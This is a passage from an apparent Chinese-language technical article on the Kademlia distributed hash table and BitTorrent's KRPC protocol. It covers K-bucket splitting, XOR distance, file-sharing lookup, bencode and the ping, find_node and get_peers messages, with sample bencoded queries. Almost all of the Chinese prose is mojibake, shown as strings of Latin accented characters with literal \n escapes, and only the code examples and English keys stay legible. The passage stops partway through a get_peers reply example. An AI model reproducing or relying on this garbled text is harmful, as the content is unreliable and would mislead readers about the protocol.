æ•´ä¸ªè¿‡ç¨‹å’Œå‘DNSæ ¹åŸŸåæœåŠ¡å™¨è¯·æ±‚è§£ææŸä¸ªåŸŸåçš„é€’å½’è¿‡ç¨‹ç±»ä¼¼\n4. è¿™ä¸€è‡ªæŸ¥è¯¢è¿‡ç¨‹ä½¿å¾—æ–°åŠ å…¥èŠ‚ç‚¹è‡ªå¼•å¯¼èŠ‚ç‚¹æ‰€åœ¨çš„é‚£ä¸ªKæ¡¶å¼€å§‹ï¼Œç”±è¿œåŠè¿‘ï¼Œå¯¹æ²¿é€”çš„æ‰€æœ‰èŠ‚ç‚¹é€æ­¥å¾—åˆ°åˆ·æ–°ï¼Œæ•´æ¡é“¾è·¯ä¸Šçš„é‚»å±…éƒ½è®¤è¯†äº†è¿™ä¸ªæ–°é‚»å±…\n5. æœ€åˆçš„æ—¶å€™ï¼ŒèŠ‚ç‚¹ä»…æœ‰ä¸€ä¸ªKæ¡¶(è¦†ç›–æ‰€æœ‰çš„IDèŒƒå›´)ï¼Œå½“æœ‰æ–°èŠ‚ç‚¹éœ€è¦æ’å…¥è¯¥Kæ¡¶æ—¶ï¼Œå¦‚æœKæ¡¶å·²æ»¡ï¼ŒKæ¡¶å°±å¼€å§‹åˆ†è£‚ï¼Œåˆ†è£‚å‘ç”Ÿåœ¨èŠ‚ç‚¹çš„Kæ¡¶çš„è¦†ç›–èŒƒå›´(è¡¨ç°ä¸ºäºŒå‰æ ‘æŸéƒ¨åˆ†ä»å·¦è‡³å³çš„æ‰€æœ‰å€¼)åŒ…å«äº†è¯¥èŠ‚ç‚¹æœ¬èº«çš„IDçš„æ—¶å€™ã€‚å¯¹äºèŠ‚ç‚¹å†…è·ç¦»èŠ‚ç‚¹æœ€è¿‘çš„é‚£ä¸ªKæ¡¶ï¼ŒKademliaå¯ä»¥æ”¾æ¾é™åˆ¶(å³å¯ä»¥åˆ°è¾¾Kæ—¶ä¸å‘ç”Ÿåˆ†è£‚)ï¼Œå› ä¸ºæ¡¶å†…çš„æ‰€æœ‰èŠ‚ç‚¹ç¦»è¯¥èŠ‚ç‚¹è·ç¦»æœ€è¿‘ï¼Œè¿™äº›èŠ‚ç‚¹ä¸ªæ•°å¾ˆå¯èƒ½è¶…è¿‡Kä¸ªï¼Œè€Œä¸”èŠ‚ç‚¹å¸Œæœ›çŸ¥é“æ‰€æœ‰çš„è¿™äº›æœ€è¿‘çš„èŠ‚ç‚¹ã€‚å› æ­¤ï¼Œåœ¨è·¯ç”±æ ‘ä¸­ï¼Œè¯¥èŠ‚ç‚¹é™„è¿‘å¾ˆå¯èƒ½å‡ºç°é«˜åº¦ä¸å¹³è¡¡çš„äºŒå‰å­æ ‘ã€‚å‡å¦‚Kæ˜¯20ï¼Œæ–°åŠ å…¥ç½‘ç»œçš„èŠ‚ç‚¹IDä¸º\"xxx000011001\"ï¼Œåˆ™å‰ç¼€ä¸º\"xxx0011...\"çš„èŠ‚ç‚¹å¯èƒ½æœ‰21ä¸ªï¼Œç”šè‡³æ›´å¤šï¼Œæ–°çš„èŠ‚ç‚¹å¯èƒ½åŒ…å«å¤šä¸ªå«æœ‰21ä¸ªä»¥ä¸ŠèŠ‚ç‚¹çš„Kæ¡¶(ä½äºèŠ‚ç‚¹é™„è¿‘çš„kæ¡¶)ã€‚è¿™ç‚¹ä¿è¯ä½¿å¾—è¯¥èŠ‚ç‚¹èƒ½å¤Ÿæ„ŸçŸ¥ç½‘ç»œä¸­é™„è¿‘åŒºåŸŸçš„æ‰€æœ‰èŠ‚ç‚¹\n\n\n### 0x8: æŸ¥è¯¢åŠ é€Ÿ\n\n\n1. Kademliaä½¿ç”¨å¼‚æˆ–æ¥å®šä¹‰è·ç¦»ã€‚ä¸¤ä¸ªèŠ‚ç‚¹IDçš„å¼‚æˆ–(æˆ–è€…èŠ‚ç‚¹IDå’Œå…³é”®å­—çš„å¼‚æˆ–)çš„ç»“æœå°±æ˜¯ä¸¤è€…ä¹‹é—´çš„è·ç¦»ã€‚å¯¹äºæ¯ä¸€ä¸ªäºŒè¿›åˆ¶ä½æ¥è¯´ï¼Œå¦‚æœç›¸åŒï¼Œå¼‚æˆ–è¿”å›0ï¼Œå¦åˆ™ï¼Œå¼‚æˆ–è¿”å›1ã€‚å¼‚æˆ–è·ç¦»æ»¡è¶³ä¸‰è§’å½¢ä¸ç­‰å¼: ä»»ä½•ä¸€è¾¹çš„è·ç¦»å°äº(æˆ–ç­‰äº)å…¶å®ƒä¸¤è¾¹è·ç¦»ä¹‹å’Œ\n2. å¼‚æˆ–è·ç¦»ä½¿å¾—Kademliaçš„è·¯ç”±è¡¨å¯ä»¥å»ºåœ¨å•ä¸ªbitä¹‹ä¸Šï¼Œå³å¯ä½¿ç”¨ä½ç»„(å¤šä¸ªä½è”åˆ)æ¥æ„å»ºè·¯ç”±è¡¨ã€‚ä½ç»„å¯ä»¥ç”¨æ¥è¡¨ç¤ºç›¸åº”çš„Kæ¡¶ï¼Œå®ƒæœ‰ä¸ªä¸“ä¸šæœ¯è¯­å«åšå‰ç¼€ï¼Œå¯¹ä¸€ä¸ªmä½çš„å‰ç¼€æ¥è¯´ï¼Œå¯å¯¹åº”2^m-1ä¸ªKæ¡¶(mä½çš„å‰ç¼€æœ¬æ¥å¯ä»¥å¯¹åº”2^mä¸ªKæ¡¶)å¦å¤–çš„é‚£ä¸ªKæ¡¶å¯ä»¥è¿›ä¸€æ­¥æ‰©å±•ä¸ºåŒ…å«è¯¥èŠ‚ç‚¹æœ¬èº«IDçš„è·¯ç”±æ ‘\n3. ä¸€ä¸ªbä½çš„å‰ç¼€å¯ä»¥æŠŠæŸ¥è¯¢çš„æœ€å¤§æ¬¡æ•°ä»lognå‡å°‘åˆ°logn/bã€‚è¿™åªæ˜¯æŸ¥è¯¢æ¬¡æ•°çš„æœ€å¤§å€¼ï¼Œå› ä¸ºè‡ªå·±Kæ¡¶å¯èƒ½æ¯”å‰ç¼€æœ‰æ›´å¤šçš„ä½ä¸ç›®æ ‡é”®ç›¸åŒï¼Œè¿™ä¼šå¢åŠ åœ¨è‡ªå·±Kæ¡¶ä¸­æ‰¾åˆ°èŠ‚ç‚¹çš„æœºä¼šï¼Œå‡è®¾å‰ç¼€æœ‰mä½ï¼Œå¾ˆå¯èƒ½æŸ¥è¯¢ä¸€ä¸ªèŠ‚ç‚¹å°±èƒ½åŒ¹é…2mç”šè‡³æ›´å¤šçš„ä½ç»„ï¼Œæ‰€ä»¥å…¶å®å¹³å‡çš„æŸ¥è¯¢æ¬¡æ•°è¦å°‘çš„å¤š \n4. èŠ‚ç‚¹å¯ä»¥åœ¨ä»–ä»¬çš„è·¯ç”±è¡¨ä¸­ä½¿ç”¨æ··åˆå‰ç¼€ï¼Œå°±åƒeMuleä¸­çš„Kadç½‘ç»œã€‚å¦‚æœä»¥å¢åŠ æŸ¥è¯¢çš„å¤æ‚æ€§ä¸ºä»£ä»·ï¼ŒKademliaç½‘ç»œåœ¨è·¯ç”±è¡¨çš„å…·ä½“å®ç°ä¸Šç”šè‡³å¯ä»¥æ˜¯æœ‰å¼‚æ„çš„\n\n\n### 0x9: åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­çš„åº”ç”¨\n\nKademliaå¯åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­ä½¿ç”¨ï¼Œé€šè¿‡åˆ¶ä½œKademliaå…³é”®å­—æœç´¢ï¼Œæˆ‘ä»¬èƒ½å¤Ÿåœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­æ‰¾åˆ°æˆ‘ä»¬éœ€è¦çš„æ–‡ä»¶ä»¥ä¾›æˆ‘ä»¬ä¸‹è½½ã€‚ç”±äºæ²¡æœ‰ä¸­å¤®æœåŠ¡å™¨å­˜å‚¨æ–‡ä»¶çš„ç´¢å¼•ï¼Œè¿™éƒ¨åˆ†å·¥ä½œå°±è¢«å¹³å‡åœ°åˆ†é…åˆ°æ‰€æœ‰çš„å®¢æˆ·ç«¯ä¸­å»\n\n\n\n1. å‡å¦‚ä¸€ä¸ªèŠ‚ç‚¹å¸Œæœ›åˆ†äº«æŸä¸ªæ–‡ä»¶ï¼Œå®ƒå…ˆæ ¹æ®æ–‡ä»¶çš„å†…å®¹æ¥å¤„ç†è¯¥æ–‡ä»¶ï¼Œé€šè¿‡è¿ç®—ï¼ŒæŠŠæ–‡ä»¶çš„å†…å®¹æ•£åˆ—æˆä¸€ç»„æ•°å­—ï¼Œè¯¥æ•°å­—åœ¨æ–‡ä»¶åˆ†äº«ç½‘ç»œä¸­å¯è¢«ç”¨æ¥æ ‡è¯†æ–‡ä»¶\n2. <font color=\"red\">è¿™ç»„æ•£åˆ—æ•°å­—å¿…é¡»å’ŒèŠ‚ç‚¹IDæœ‰åŒæ ·çš„é•¿åº¦ï¼Œç„¶åï¼Œè¯¥èŠ‚ç‚¹ä¾¿åœ¨ç½‘ç»œä¸­æœç´¢IDå€¼ä¸æ–‡ä»¶çš„æ•£åˆ—å€¼ç›¸è¿‘çš„èŠ‚ç‚¹ï¼Œç„¶åå‘è¿™äº›è¢«æœç´¢åˆ°çš„èŠ‚ç‚¹å¹¿æ’­è‡ªå·±(å³æŠŠå®ƒè‡ªå·±çš„IPåœ°å€å­˜å‚¨åœ¨é‚£äº›æœç´¢åˆ°çš„èŠ‚ç‚¹ä¸Š)ï¼Œæœ¬è´¨æ„æ€æ˜¯è¯´: \"ä½ å¦‚æœè¦æœç´¢è¿™ä¸ªæ–‡ä»¶ï¼Œå°±å»æ‰¾é‚£äº›èŠ‚ç‚¹IDå°±å¥½äº†ï¼Œé‚£äº›èŠ‚ç‚¹IDä¼šå‘Šè¯‰æœç´¢è€…åº”è¯¥åˆ°è‡ªå·±è¿™é‡Œæ¥(æ–‡ä»¶å‘å¸ƒè€…)æ¥å»ºç«‹TCPè¿æ¥ï¼Œä¸‹è½½æ–‡ä»¶\"ï¼Œ</font><font color=\"blue\">ä¹Ÿå°±æ˜¯è¯´ï¼Œå®ƒæŠŠè‡ªå·±ä½œä¸ºæ–‡ä»¶çš„æºè¿›è¡Œäº†å‘å¸ƒ(æ–‡ä»¶å…±äº«æ–¹å¼)ã€‚æ­£åœ¨è¿›è¡Œæ–‡ä»¶æœç´¢çš„å®¢æˆ·ç«¯å°†ä½¿ç”¨Kademliaåè®®æ¥å¯»æ‰¾ç½‘ç»œä¸ŠIDå€¼ä¸å¸Œæœ›å¯»æ‰¾çš„æ–‡ä»¶çš„æ•£åˆ—å€¼æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹(å¯»æ‰¾æ–‡ä»¶çš„è¿‡ç¨‹å’Œå¯»æ‰¾èŠ‚ç‚¹çš„æœºåˆ¶å½¢æˆäº†ç»Ÿä¸€ï¼Œå› ä¸ºæ–‡ä»¶å’ŒèŠ‚ç‚¹çš„IDçš„HASHæ ¼å¼æ˜¯ä¸€æ ·çš„)ï¼Œç„¶åå–å¾—å­˜å‚¨åœ¨é‚£ä¸ªèŠ‚ç‚¹ä¸Šçš„æ–‡ä»¶æºåˆ—è¡¨</font> \n3. ç”±äºä¸€ä¸ªé”®(HASH)å¯ä»¥å¯¹åº”å¾ˆå¤šå€¼ï¼Œå³åŒä¸€ä¸ªæ–‡ä»¶(é€šè¿‡ä¸€ä¸ªå¯¹åº”çš„HASHå…¬å¸ƒåˆ°P2Pç½‘ç»œä¸­)å¯ä»¥æœ‰å¤šä¸ªæº(å› ä¸ºå¯èƒ½æœ‰å¤šä¸ªèŠ‚ç‚¹éƒ½ä¼šæœ‰è¿™ä¸ªæ–‡ä»¶çš„æ‹·è´)ï¼Œæ¯ä¸€ä¸ªå­˜å‚¨æºåˆ—è¡¨çš„èŠ‚ç‚¹å¯èƒ½æœ‰ä¸åŒçš„æ–‡ä»¶çš„æºçš„ä¿¡æ¯ï¼Œè¿™æ ·çš„è¯ï¼Œæºåˆ—è¡¨å¯ä»¥ä»ä¸é”®å€¼ç›¸è¿‘çš„Kä¸ªèŠ‚ç‚¹è·å¾—ã€‚ æ–‡ä»¶çš„æ•£åˆ—å€¼é€šå¸¸å¯ä»¥ä»å…¶ä»–çš„ä¸€äº›ç‰¹åˆ«çš„Interneté“¾æ¥çš„åœ°æ–¹è·å¾—ï¼Œæˆ–è€…è¢«åŒ…å«åœ¨ä»å…¶ä»–æŸå¤„è·å¾—çš„ç´¢å¼•æ–‡ä»¶ä¸­(å³ç§å­æ–‡ä»¶)\n4. æ–‡ä»¶åçš„æœç´¢å¯ä»¥ä½¿ç”¨å…³é”®è¯æ¥å®ç°ï¼Œæ–‡ä»¶åå¯ä»¥åˆ†å‰²æˆè¿ç»­çš„å‡ ä¸ªå…³é”®è¯ï¼Œè¿™äº›å…³é”®è¯éƒ½å¯ä»¥æ•£åˆ—å¹¶ä¸”å¯ä»¥å’Œç›¸åº”çš„æ–‡ä»¶åå’Œæ–‡ä»¶æ•£åˆ—å‚¨å­˜åœ¨ç½‘ç»œä¸­ã€‚æœç´¢è€…å¯ä»¥ä½¿ç”¨å…¶ä¸­çš„æŸä¸ªå…³é”®è¯ï¼Œè”ç³»IDå€¼ä¸å…³é”®è¯æ•£åˆ—æœ€è¿‘çš„é‚£ä¸ªèŠ‚ç‚¹ï¼Œå–å¾—åŒ…å«è¯¥å…³é”®è¯çš„æ–‡ä»¶åˆ—è¡¨ã€‚ç”±äºåœ¨æ–‡ä»¶åˆ—è¡¨ä¸­çš„æ–‡ä»¶éƒ½æœ‰ç›¸å…³çš„æ•£åˆ—å€¼ï¼Œé€šè¿‡è¯¥æ•£åˆ—å€¼å°±å¯åˆ©ç”¨ä¸Šè¿°é€šå¸¸å–æ–‡ä»¶çš„æ–¹æ³•è·å¾—è¦æœç´¢çš„æ–‡ä»¶\n\n\n\n# 3. KRPC åè®® KRPC Protocol\n\nKRPCæ˜¯BitTorrentåœ¨Kademliaç†è®ºåŸºç¡€ä¹‹ä¸Šå®šä¹‰çš„ä¸€ä¸ªé€šä¿¡æ¶ˆæ¯æ ¼å¼åè®®ï¼Œä¸»è¦ç”¨æ¥æ”¯æŒpeerèŠ‚ç‚¹çš„è·å–(get_peer)å’ŒpeerèŠ‚ç‚¹çš„å£°æ˜(announce_peer)ï¼Œä»¥åŠåˆ¤æ´»å¿ƒè·³(ping)ã€èŠ‚ç‚¹å¯»å€(find_node)ï¼Œå®ƒåœ¨find_nodeçš„åŸç†ä¸Šå’ŒDHTæ˜¯ä¸€æ ·çš„ï¼ŒåŒæ—¶å¢åŠ äº†get_peer/announce_peer/pingåè®®çš„æ”¯æŒ\n\nKRPCåè®®æ˜¯ç”±Bç¼–ç ç»„æˆçš„ä¸€ä¸ªç®€å•çš„RPCç»“æ„ï¼Œæœ‰4ç§è¯·æ±‚ï¼špingã€find_nodeã€get_peers å’Œ announce_peer\n\n\n### 0x0: bencodeç¼–ç \n\nbencode æœ‰ 4 ç§æ•°æ®ç±»å‹: string, integer, list å’Œ dictionary\n\n```\n1. string: å­—ç¬¦æ˜¯ä»¥è¿™ç§æ–¹å¼ç¼–ç çš„: <å­—ç¬¦ä¸²é•¿åº¦>:<å­—ç¬¦ä¸²> \nå¦‚ hell: 4:hell\n\n2. integer: æ•´æ•°æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: i<æ•´æ•°>e \nå¦‚ 1999: i1999e\n\n3. list: åˆ—è¡¨æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: l[æ•°æ®1][æ•°æ®2][æ•°æ®3][â€¦]e \nå¦‚åˆ—è¡¨ [hello, world, 101]ï¼šl5:hello5:worldi101ee\n\n4. dictionary: å­—å…¸æ˜¯ä¸€è¿™ç§æ–¹å¼ç¼–ç çš„: d[key1][value1][key2][value2][â€¦]eï¼Œå…¶ä¸­ key å¿…é¡»æ˜¯ string è€Œä¸”æŒ‰ç…§å­—æ¯é¡ºåºæ’åº \nå¦‚å­—å…¸ {aa:100, bb:bb, cc:200}ï¼š d2:aai100e2:bb2:bb2:cci200ee\n```\n\nKRPC åè®®æ˜¯ç”± bencode ç¼–ç ç»„æˆçš„ä¸€ä¸ªç®€å•çš„ RPC ç»“æ„ï¼Œä»–ä½¿ç”¨ UDP æŠ¥æ–‡å‘é€ã€‚ä¸€ä¸ªç‹¬ç«‹çš„è¯·æ±‚åŒ…è¢«å‘å‡ºå»ç„¶åä¸€ä¸ªç‹¬ç«‹çš„åŒ…è¢«å›å¤ã€‚è¿™ä¸ªåè®®æ²¡æœ‰é‡å‘(UDPæ˜¯æ— è¿æ¥åè®®)\n\n\n### 0x1: KRPCå­—å…¸åŸºæœ¬ç»„æˆå…ƒç´ \n\nä¸€æ¡ KRPC æ¶ˆæ¯å³å¯èƒ½æ˜¯requestï¼Œä¹Ÿå¯èƒ½æ˜¯responseï¼Œç”±ä¸€ä¸ªç‹¬ç«‹çš„å­—å…¸ç»„æˆ\n\n```\n1. tå…³é”®å­—: æ¯æ¡æ¶ˆæ¯éƒ½åŒ…å« t å…³é”®å­—ï¼Œå®ƒæ˜¯ä¸€ä¸ªä»£è¡¨äº† transaction ID çš„å­—ç¬¦ä¸²ã€‚transaction ID ç”±è¯·æ±‚èŠ‚ç‚¹äº§ç”Ÿï¼Œå¹¶ä¸”å›å¤ä¸­è¦åŒ…å«å›æ˜¾è¯¥å­—æ®µ(æŒ‘æˆ˜-å“åº”æ¨¡å‹)ï¼Œæ‰€ä»¥å›å¤å¯èƒ½å¯¹åº”ä¸€ä¸ªèŠ‚ç‚¹çš„å¤šä¸ªè¯·æ±‚ã€‚transaction ID åº”å½“è¢«ç¼–ç ä¸ºä¸€ä¸ªçŸ­çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²ï¼Œæ¯”å¦‚ 2 ä¸ªå­—èŠ‚ï¼Œè¿™æ ·å°±å¯ä»¥å¯¹åº” 2^16 ä¸ªè¯·æ±‚\n2. yå…³é”®å­—: å®ƒç”±ä¸€ä¸ªå­—èŠ‚ç»„æˆï¼Œè¡¨æ˜è¿™ä¸ªæ¶ˆæ¯çš„ç±»å‹ã€‚y å¯¹åº”çš„å€¼æœ‰ä¸‰ç§æƒ…å†µ\n    1) q è¡¨ç¤ºè¯·æ±‚(è¯·æ±‚Queries): qç±»å‹çš„æ¶ˆæ¯å®ƒåŒ…å« 2 ä¸ªé™„åŠ çš„å…³é”®å­— q å’Œ a\n        1.1) å…³é”®å­— q: æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«äº†è¯·æ±‚çš„æ–¹æ³•åå­—(get_peers/announce_peer/ping/find_node)\n        1.2) å…³é”®å­— a: ä¸€ä¸ªå­—å…¸ç±»å‹åŒ…å«äº†è¯·æ±‚æ‰€é™„åŠ çš„å‚æ•°(info_hash/id..)\n    2) r è¡¨ç¤ºå›å¤(å›å¤ Responses): åŒ…å«äº†è¿”å›çš„å€¼ã€‚å‘é€å›å¤æ¶ˆæ¯æ˜¯åœ¨æ­£ç¡®è§£æäº†è¯·æ±‚æ¶ˆæ¯çš„åŸºç¡€ä¸Šå®Œæˆçš„ï¼ŒåŒ…å«äº†ä¸€ä¸ªé™„åŠ çš„å…³é”®å­— rã€‚å…³é”®å­— r æ˜¯å­—å…¸ç±»å‹\n        2.1) id: peerèŠ‚ç‚¹idå·æˆ–è€…ä¸‹ä¸€è·³DHTèŠ‚ç‚¹\n                2.2) nodes\": \"\" \n                2.3) token: token\n    3) e è¡¨ç¤ºé”™è¯¯(é”™è¯¯ Errors): åŒ…å«ä¸€ä¸ªé™„åŠ çš„å…³é”®å­— eï¼Œå…³é”®å­— e æ˜¯åˆ—è¡¨ç±»å‹\n        3.1) ç¬¬ä¸€ä¸ªå…ƒç´ æ˜¯æ•°å­—ç±»å‹ï¼Œè¡¨æ˜äº†é”™è¯¯ç ï¼Œå½“ä¸€ä¸ªè¯·æ±‚ä¸èƒ½è§£ææˆ–å‡ºé”™æ—¶ï¼Œé”™è¯¯åŒ…å°†è¢«å‘é€ã€‚ä¸‹è¡¨æè¿°äº†å¯èƒ½å‡ºç°çš„é”™è¯¯ç \n        201: ä¸€èˆ¬é”™è¯¯\n        202: æœåŠ¡é”™è¯¯\n        203: åè®®é”™è¯¯ï¼Œæ¯”å¦‚ä¸è§„èŒƒçš„åŒ…ï¼Œæ— æ•ˆçš„å‚æ•°ï¼Œæˆ–è€…é”™è¯¯çš„ toke\n        204: æœªçŸ¥æ–¹æ³• \n        3.2) ç¬¬äºŒä¸ªå…ƒç´ æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼Œè¡¨æ˜äº†é”™è¯¯ä¿¡æ¯\n```\n\nä»¥ä¸Šæ˜¯æ•´ä¸ªKRPCçš„åè®®æ¡†æ¶ç»“æ„ï¼Œå…·ä½“åˆ°è¯·æ±‚Query/å›å¤Response/é”™è¯¯Errorè¿˜æœ‰å…·ä½“çš„åè®®å®ç°\n\n\n### 0x2: è¯·æ±‚Queryå…·ä½“åè®®\n\næ‰€æœ‰çš„è¯·æ±‚éƒ½åŒ…å«ä¸€ä¸ªå…³é”®å­— idï¼Œå®ƒåŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„èŠ‚ç‚¹ IDã€‚æ‰€æœ‰çš„å›å¤ä¹ŸåŒ…å«å…³é”®å­—idï¼Œå®ƒåŒ…å«äº†å›å¤èŠ‚ç‚¹çš„èŠ‚ç‚¹ ID\n\n\n+ <font color=\"red\"> ping: æ£€æµ‹èŠ‚ç‚¹æ˜¯å¦å¯è¾¾ï¼Œè¯·æ±‚åŒ…å«ä¸€ä¸ªå‚æ•°idï¼Œä»£è¡¨è¯¥èŠ‚ç‚¹çš„nodeIDã€‚å¯¹åº”çš„å›å¤ä¹Ÿåº”è¯¥åŒ…å«å›å¤è€…çš„nodeID </font>\n\n```\nping Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"ping\", \"a\":{\"id\":\"abcdefghij0123456789\"}}\nbencoded = d1:ad2:id20:abcdefghij0123456789e1:q4:ping1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"mnopqrstuvwxyz123456\"}}\nbencoded = d1:rd2:id20:mnopqrstuvwxyz123456e1:t2:aa1:y1:re\n```\n\n+ <font color=\"red\"> find_node: find_node è¢«ç”¨æ¥æŸ¥æ‰¾ç»™å®š ID çš„DHTèŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯ï¼Œè¯¥è¯·æ±‚åŒ…å«ä¸¤ä¸ªå‚æ•°id(ä»£è¡¨è¯¥èŠ‚ç‚¹çš„nodeID)å’Œtargetã€‚å›å¤ä¸­åº”è¯¥åŒ…å«è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­è·ç¦»targetæœ€æ¥è¿‘çš„Kä¸ªnodeIDä»¥åŠå¯¹åº”çš„nodeINFO</font>\n```\nfind_node Query = {\"t\":\"aa\", \"y\":\"q\", \"q\":\"find_node\", \"a\": {\"id\":\"abcdefghij0123456789\", \"target\":\"mnopqrstuvwxyz123456\"}}\n# \"id\" containing the node ID of the querying node, and \"target\" containing the ID of the node sought by the queryer. \nbencoded = d1:ad2:id20:abcdefghij01234567896:target20:mnopqrstuvwxyz123456e1:q9:find_node1:t2:aa1:y1:qe\n\t\nResponse = {\"t\":\"aa\", \"y\":\"r\", \"r\": {\"id\":\"0123456789abcdefghij\", \"nodes\": \"def456...\"}}\nbencoded = d1:rd2:id20:0123456789abcdefghij5:nodes9:def456...e1:t2:aa1:y1:re\n```\n\nfind_node è¯·æ±‚åŒ…å« 2 ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ idï¼ŒåŒ…å«äº†è¯·æ±‚èŠ‚ç‚¹çš„IDã€‚ç¬¬äºŒä¸ªå‚æ•°æ˜¯ targetï¼ŒåŒ…å«äº†è¯·æ±‚è€…æ­£åœ¨æŸ¥æ‰¾çš„èŠ‚ç‚¹çš„ID\n\t\nå½“ä¸€ä¸ªèŠ‚ç‚¹æ¥æ”¶åˆ°äº† find_node çš„è¯·æ±‚ï¼Œä»–åº”è¯¥ç»™å‡ºå¯¹åº”çš„å›å¤ï¼Œå›å¤ä¸­åŒ…å« 2 ä¸ªå…³é”®å­— id(è¢«è¯·æ±‚èŠ‚ç‚¹çš„id) å’Œ nodesï¼Œnodes æ˜¯å­—ç¬¦ä¸²ç±»å‹ï¼ŒåŒ…å«äº†è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­æœ€æ¥è¿‘ç›®æ ‡èŠ‚ç‚¹çš„ K(8) ä¸ªæœ€æ¥è¿‘çš„èŠ‚ç‚¹çš„è”ç³»ä¿¡æ¯(è¢«è¯·æ±‚æ–¹æ¯æ¬¡éƒ½ç»Ÿä¸€è¿”å›æœ€é è¿‘ç›®æ ‡èŠ‚ç‚¹çš„èŠ‚ç‚¹åˆ—è¡¨Kæ…)\n\t\n```\nå‚æ•°: {\"id\" : \"<querying nodes id>\", \"target\" : \"<id of target node>\"}\nå›å¤: {\"id\" : \"<queried nodes id>\", \"nodes\" : \"<compact node info>\"}\n```\n\nè¿™é‡Œè¦æ˜ç¡®3ä¸ªæ¦‚å¿µ:\n\t\n1. è¯·æ±‚æ–¹çš„id: å‘èµ·è¿™ä¸ªDHTèŠ‚ç‚¹å¯»å€çš„èŠ‚ç‚¹è‡ªèº«çš„IDï¼Œå¯ä»¥ç±»æ¯”DNSæŸ¥è¯¢ä¸­çš„å®¢æˆ·ç«¯\n2. ç›®æ ‡target id: éœ€è¦æŸ¥è¯¢çš„ç›®æ ‡IDå·ï¼Œå¯ä»¥ç±»æ¯”äºDNSæŸ¥è¯¢ä¸­çš„URLï¼Œè¿™ä¸ªIDåœ¨æ•´ä¸ªé€’å½’æŸ¥è¯¢ä¸­æ˜¯ä¸€ç›´ä¸å˜çš„\n3. è¢«è¯·æ±‚èŠ‚ç‚¹çš„id: åœ¨èŠ‚ç‚¹çš„é€’å½’æŸ¥è¯¢ä¸­ï¼Œè¯·æ±‚æ–¹ç”±è¿œåŠè¿‘ä¸æ–­è¯¢é—®æ•´ä¸ªé“¾è·¯ä¸Šçš„èŠ‚ç‚¹ï¼Œæ²¿é€”çš„æ¯ä¸ªèŠ‚ç‚¹åœ¨è¿”å›æ—¶éƒ½è¦å¸¦ä¸Šè‡ªå·±çš„idå·\n\n\t\n+ <font color=\"red\"> get_peers: è·å– infohash çš„ peers</font>\n\n\n1. get_peers è¯·æ±‚åŒ…å« 2 ä¸ªå‚æ•°(idè¯·æ±‚èŠ‚ç‚¹IDï¼Œinfo_hashä»£è¡¨torrentæ–‡ä»¶çš„infohashï¼Œinfohashä¸ºç§å­æ–‡ä»¶çš„SHA1å“ˆå¸Œå€¼ï¼Œä¹Ÿå°±æ˜¯ç£åŠ›é“¾æ¥çš„btihå€¼)\n\n2. response get_peer: \n\n\t1) å¦‚æœè¢«è¯·æ±‚çš„èŠ‚ç‚¹æœ‰å¯¹åº” info_hash çš„ peersï¼Œä»–å°†è¿”å›ä¸€ä¸ªå…³é”®å­— valuesï¼Œè¿™æ˜¯ä¸€ä¸ªåˆ—è¡¨ç±»å‹çš„å­—ç¬¦ä¸²ã€‚æ¯ä¸€ä¸ªå­—ç¬¦ä¸²åŒ…å«äº† \"CompactIP-address/portinfo\" æ ¼å¼çš„ peers ä¿¡æ¯(å³å¯¹åº”çš„æœºå™¨ip/portä¿¡æ¯)(peerçš„infoä¿¡æ¯å’ŒDHTèŠ‚ç‚¹çš„infoä¿¡æ¯æ˜¯ä¸€æ ·çš„)\n\n\t2) å¦‚æœè¢«è¯·æ±‚çš„èŠ‚ç‚¹æ²¡æœ‰è¿™ä¸ª infohash çš„ peersï¼Œé‚£ä¹ˆä»–å°†è¿”å›å…³é”®å­— nodes(éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œå¦‚æœè¯¥èŠ‚ç‚¹æ²¡æœ‰å¯¹åº”çš„infohashä¿¡æ¯ï¼Œè€Œåªæ˜¯è¿”å›äº†nodesï¼Œåˆ™è¯·æ±‚æ–¹ä¼šè®¤ä¸ºè¯¥èŠ‚ç‚¹æ˜¯ä¸€ä¸ª\"å¯ç–‘èŠ‚ç‚¹\"ï¼Œåˆ™ä¼šä»è‡ªå·±çš„è·¯ç”±è¡¨Kæ…ä¸­åˆ é™¤è¯¥èŠ‚ç‚¹)ï¼Œè¿™ä¸ªå…³é”®å­—åŒ…å«äº†è¢«è¯·æ±‚èŠ‚ç‚¹çš„è·¯ç”±è¡¨ä¸­ç¦» info_hash æœ€è¿‘çš„ K ä¸ªèŠ‚ç‚¹(æˆ‘è¿™é‡Œæ²¡æœ‰è¯¥èŠ‚ç‚¹ï¼Œå»åˆ«çš„èŠ‚ç‚¹è¯•è¯•è¿æ°”)ï¼Œä½¿ç”¨ \"Compactnodeinfo\" æ ¼å¼å›å¤ã€‚åœ¨è¿™ä¸¤ç§æƒ…å†µä¸‹ï¼Œå…³é”®å­— token éƒ½å°†è¢«è¿”å›ã€‚token å…³é”®å­—åœ¨ä»Šåçš„ annouce_peer è¯·æ±‚ä¸­å¿…é¡»è¦æºå¸¦ã€‚token æ˜¯ä¸€ä¸ªçŸ­çš„äºŒè¿›åˆ¶å­—ç¬¦ä¸²\n\n\t\n```\nå‚æ•°: {\"id\" : \"<querying nodes id>\", \"info_hash\" : \"<20-byte infohash of target torrent>\"}\n\t\nå›å¤: \n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", \"values\" : [\"<peer 1 info string>\", \"<peer 2 info string>\"]}\næˆ–: \t\n{\"id\" : \"<queried nodes id>\", \"token\" :\"<opaque write token>\", 